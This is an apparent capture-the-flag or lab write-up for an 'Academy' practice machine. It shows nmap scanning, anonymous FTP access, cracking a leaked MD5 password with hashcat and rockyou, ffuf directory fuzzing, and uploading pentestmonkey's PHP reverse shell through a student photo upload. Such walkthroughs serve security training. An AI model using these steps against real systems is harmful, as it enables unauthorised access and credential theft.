
Password: tcm
IP: 192.168.64.3

## Reconaissance/Enumeration

- nmap -A -p- -T4 192.168.64.3
```
──(kali㉿kali)-[~]
└─$ nmap -A -p- -T4 192.168.64.3
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-19 15:44 PDT
Nmap scan report for 192.168.64.3
Host is up (0.0071s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.64.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.61 seconds
```

**Port 21 - VSFTPD is open**
**Port 80** - **Open**
**Port22** - **Open**

## Enumerate the HTTP

- Access the http://192.168.64.3
![Alt](../../Images/academypage.png)

Checking path in the web reveals the Apache version

![Alt](../../Images/academyredirect.png)
**Note: Finding revealing too much information**

## Exploiting FTP

username: anonymous
password: anonymous

```
ftp 192.168.64.3
Connected to 192.168.64.3.
220 (vsFTPd 3.0.3)
Name (192.168.64.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

Download the files in ntp
- using `get` for download and `put` for upload
- for this one, we will use the `get`
```
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||51850|)
150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |********************************|   776       11.93 MiB/s    00:00 ETA
226 Transfer complete.
776 bytes received in 00:00 (124.80 KiB/s)
ftp> 

```

- Checking the content of the downloaded note.txt. We see a list of username and password that will be insert into the database.
```
┌──(kali㉿kali)-[~]
└─$ cat note.txt 
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta

```

### Lets check the value of the hash

- We can use the `hash-identifier` service in the kali
- In the results, it said that it must be MD5 Hash
```
┌──(kali㉿kali)-[~]
└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: cd73502828457d15655bbd7a63fb0bc8

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))


```

- Run the hashcat
	- Locate the rockyou.txt first
		- `locate rockyou.txt`
	- save the hash value in hashes.txt
		- `mousepad hashes.txt` or `vi hashes.txt`
	- Run the hashcat. It will take a while, it consumes your GPU
		- `hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt`
		- 0 means MD5
		- As checked, the password is **student**

```
Host memory required for this attack: 1 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (2Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106869 bytes (4Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660302 bytes (Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 4 secs

cd73502828457d15655bbd7a63fb0bc8:student                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: cd73502828457d15655bbd7a63fb0bc8
Time.Started.....: Wed Jun 19 16:22:16 2024 (0 secs)
Time.Estimated...: Wed Jun 19 16:22:16 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     9626 H/s (0.50ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1

Started: Wed Jun 19 16:20:33 2024
Stopped: Wed Jun 19 16:22:18 2024

```

When you use `--show` after the hashchat finisihed, you will see that the password is student

You also see
┌──(root㉿kali)-[~]
└─# hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
cd73502828457d15655bbd7a63fb0bc8:student


## Using the dirb 

dirbuster to check the directories

- `dirb http://192.168.64.3`
It will check all he directories exists in the machine


```
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.64.3

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jul  3 15:46:52 2024
URL_BASE: http://192.168.64.3/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://192.168.64.3/ ----
                                                                             + http://192.168.64.3/index.html (CODE:200|SIZE:10701)                      
                                                                             ==> DIRECTORY: http://192.168.64.3/phpmyadmin/
+ http://192.168.64.3/server-status (CODE:403|SIZE:277)                     
                                                                            
---- Entering directory: http://192.168.64.3/phpmyadmin/ ----
                                                                             + http://192.168.64.3/phpmyadmin/ChangeLog (CODE:200|SIZE:17598)            
                                                                             ==> DIRECTORY: http://192.168.64.3/phpmyadmin/doc/

```


## Using tool ffuf

- Install the ffuf first
```
┌──(root㉿kali)-[~]
└─# apt install ffuf
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
ffuf is already the newest version (2.1.0-1).
ffuf set to manually installed.
The following packages were automatically installed and are no longer required:
  cython3 libboost-dev libboost1.74-dev libgphoto2-l10n libnsl-dev
  libopenblas-dev libopenblas-pthread-dev libopenblas0
  libpthread-stubs0-dev libpython3-all-dev libtirpc-dev libucl1
  libxsimd-dev python3-all-dev python3-backcall python3-beniget
  python3-future python3-gast python3-jdcal python3-pickleshare
  python3-pyminifier python3-pythran python3-requests-toolbelt
  python3-rfc3986 python3-unicodecsv zenity zenity-common
Use 'apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 843 not upgraded.

```

- Execute the ffuf
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.64.3/FUZZ

```
	- You can limit certain responses of ffuf

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.64.3/FUZZ -mc 200,204,301,302,307,401,403,405

```

Here is the output of ffuf

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.64.3/FUZZ -mc 200,204,301,302,307,401,403,405

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.64.3/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

# on atleast 2 different hosts [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 9ms]
# Copyright 2007 James Fisher [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 26ms]
#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 26ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 18ms]
#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 25ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 28ms]
#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 39ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 28ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 742ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 793ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 836ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 881ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 902ms]
#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 949ms]
academy                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 10ms]
phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 3ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 12ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 24ms]
:: Progress: [220560/220560] :: Job [1/1] :: 2898 req/sec :: Duration: [0:01:12] :: Errors: 0 ::

```


- As checked in ffuf, there is web directory `academy` ->
```
academy                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 10ms]

```

- Now access the academy http://192.168.64.3/academy

![Alt](../../Images/academywebdir.png)


Based from the database:

```
INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');
```

The StudentRegNo is **10201321** and the password is the decoded cd73502828457d15655bbd7a63fb0bc8 which is **student**


![[Pasted image 20240706003400.png]]


Searching for php revere shell online

We found out https://github.com/pentestmonkey/php-reverse-shell

Copy the code https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php to your kali

In the php-reverse-shell.php code, we need to change the IP address(ip of our kali). WE can change the port number as well but now we will leave this as port 1234


![[Pasted image 20240706003924.png]]

Our Kali's Ip address is 192.168.64.4

Now, we will do reverse shell in our kali while uploading rever shell php code into the student photo

![[Pasted image 20240706004736.png]]



![[Pasted image 20240706004802.png]]











